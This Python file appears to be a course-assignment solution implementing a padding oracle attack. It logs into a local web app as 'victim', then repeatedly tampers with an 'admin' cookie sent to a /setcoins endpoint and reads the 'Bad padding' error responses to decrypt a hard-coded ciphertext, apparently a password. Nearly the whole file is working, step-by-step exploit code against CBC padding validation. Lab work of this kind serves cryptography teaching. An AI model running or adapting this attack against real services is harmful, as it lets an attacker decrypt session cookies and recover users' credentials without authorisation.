import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.primitives.ciphers import algorithms
from cryptography.hazmat.backends import default_backend

import base64
import binascii
from app.api import encr_decr

from requests import codes, Session


SETCOINS_FORM_URL = "http://localhost:8080/setcoins"
LOGIN_FORM_URL = "http://localhost:8080/login"

#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = ciphers.algorithms.AES.block_size/8

    @property
    def block_length(self):
        return self._block_size_bytes

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self, ct):
        pass

def split_into_blocks(msg, l):
    while msg:
        yield msg[:int(l)]
        msg = msg[int(l):]

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length message.
    @po: an instance of padding oracle.
    You don't have to unpad the message.
    """

    #create a session and pass login credentials to the server
    sess = Session()

    data_dict = {"username":'victim',\
    "password":'victim',\
    "login":"Login"
    }
    response = sess.post(LOGIN_FORM_URL,data_dict)

    #further down we will call /setcoin to check if there are padding errors when
    #resetting the admin cookie with hex string of our padding oracle attack output
    #to do so, we define the parameters for the data_dict here that will be referenced later
    data_dict = {}
    data_dict['username'] = 'victim'
    data_dict['amount'] = str(0)


    #split the ciphertext into blocks of valid block_length
    #store the number of blocks and block length
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    block_length = len(ctx_blocks[0])


    #create an empty string to store the full password
    #by concatenating the return strings for each block
    full_pw_str = ''


    #iterate through each block of ciphertext
    #create a string for the result of the padding oracle attack for that blocks
    #while we iterate through the block create a list to store intermediate values
    #for each byte in the block
    for block_index in range(nblocks-1):
        block_str = ''
        intermediate = [None]*block_length

        #for each block we will iterate through each byte of the given blocks
        #we work from rightmost byte to leftmost. In this case from 15 to 0
        #so we use a decrementing for loop
        #for each byte within a given block, we will try all values from 0 to 255
        #using an incrementing for loop
        #one of these guesses followed with the logic below will provide valid padding
        #padding values are defined and chosen based on which byte we are looking at
        for i in range(block_length-1,-1,-1):
            for j in range(0,256):
                pad_val = block_length - i


                #for the below, we use if, elif, else to create a ciphertext to submit to the server
                #to check for valid padding. We have cases for the first and last byte
                #the first byte will require passing another block of ciphertext
                #the last byte we simply append a byte we change to the end
                #for all other bytes we will take we will take bytes prior to the "guessing byte"
                #append the guessing byte, and then append values to maintain valid padding for earlier bytes (rightmost)
                #to do so we XOR the pad val with the intermediate value for that given byte
                if i == block_length-1:
                    append_byte = j.to_bytes(1,byteorder="big")

                    altered_prev_block = ctx_blocks[block_index][0:i] + append_byte
                    current_block = ctx_blocks[block_index+1]

                    prev_and_altered_current = altered_prev_block + current_block
                elif i == 0:
                    all_zeros = b'\x00'*16
                    append_byte = j.to_bytes(1,byteorder="big")
                    altered_prev_block = ctx_blocks[block_index][0:i] + append_byte

                    for k in range(pad_val-1,0,-1):
                        append_val = pad_val ^ intermediate[block_length-k]
                        append_byte = append_val.to_bytes(1,byteorder="big")
                        altered_prev_block = altered_prev_block + append_byte

                    current_block = ctx_blocks[block_index+1]

                    prev_and_altered_current = all_zeros + altered_prev_block + current_block
                else:
                    append_byte = j.to_bytes(1,byteorder="big")
                    altered_prev_block = ctx_blocks[block_index][0:i] + append_byte

                    for k in range(pad_val-1,0,-1):
                        append_val = pad_val ^ intermediate[block_length-k]
                        append_byte = append_val.to_bytes(1,byteorder="big")
                        altered_prev_block = altered_prev_block + append_byte

                    current_block = ctx_blocks[block_index+1]

                    prev_and_altered_current = altered_prev_block + current_block

                #once we have a valid ciphertext, we reset the admin cookie to that value and
                #submit a post request to the server for /setcoin
                prev_and_altered_current_hex = prev_and_altered_current.hex()
                sess.cookies['admin'] = None
                sess.cookies['admin'] = prev_and_altered_current_hex

                #store the response from the server to check if the padding was valid
                #for the guess ciphertext submitted
                response = sess.post(SETCOINS_FORM_URL, data_dict)


                #if the padding is invalid pass
                if 'Bad padding for admin cookie!' in str(response.content):
                    pass

                #if the padding is valid, it is possible that there is more than one valid padding
                #for the given byte, however we want to find the padding that is valid for the entire block
                #we will want to assess whether or not changing the prior byte will affect the padding or not
                #we want to find the case where it does not
                #we create a flag to assess whether or not to add the guess if it is valid
                else:
                    add_flag = False

                    #calculate the intermediate byte val
                    intermediate_byte = j ^ pad_val

                    #if i is not 0 there will be a prior byte to check for a padding error
                    #we follow the same methodology as above, only we change a bit in the prior byte
                    #if the server response is not bad padding we will determine this is a valid guess
                    #and store the intermediate value
                    if i != 0:
                        prior_byte = altered_prev_block[i-1]
                        adjusted_prior = prior_byte ^ 1
                        adjusted_prior_byte = adjusted_prior.to_bytes(1,byteorder="big")
                        new_prior = altered_prev_block[0:i-1] + adjusted_prior_byte + altered_prev_block[i:]
                        prev_and_altered_current = new_prior + current_block

                        prev_and_altered_current_hex = prev_and_altered_current.hex()
                        sess.cookies['admin'] = None
                        sess.cookies['admin'] = prev_and_altered_current_hex

                        response = sess.post(SETCOINS_FORM_URL, data_dict)
                        if 'Bad padding for admin cookie!' in str(response.content):
                            pass
                        else:
                            add_flag = True
                    else:
                        add_flag = True


                    #if add_flag is true we set the intermediate byte and calculate the plain text val
                    #we then append the val to the plaintext block str
                    if add_flag == True:
                        intermediate[i] = intermediate_byte
                        plain_val= ctx_blocks[block_index][i] ^ intermediate_byte
                        byte_val = plain_val.to_bytes(1,byteorder="big")
                        block_str = chr(plain_val) + block_str

        #lastly, we will concatenate each block string to the full string and return that value
        full_pw_str = full_pw_str + block_str
    return full_pw_str


#do_attack creates a padding oracle object with the /setcoin url and takes ciphertext which is converted to hex
#pass both as arguements to po_attack 
def do_attack(ctx):
    url = SETCOINS_FORM_URL
    po_obj = PaddingOracle(url)
    byte_ctx = bytes.fromhex(ctx)

    pw = po_attack(po_obj,byte_ctx)
    return pw


#set password to the return val from do_attack on the hex value provided and print the result to the user
password = do_attack('e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d')
print(password)
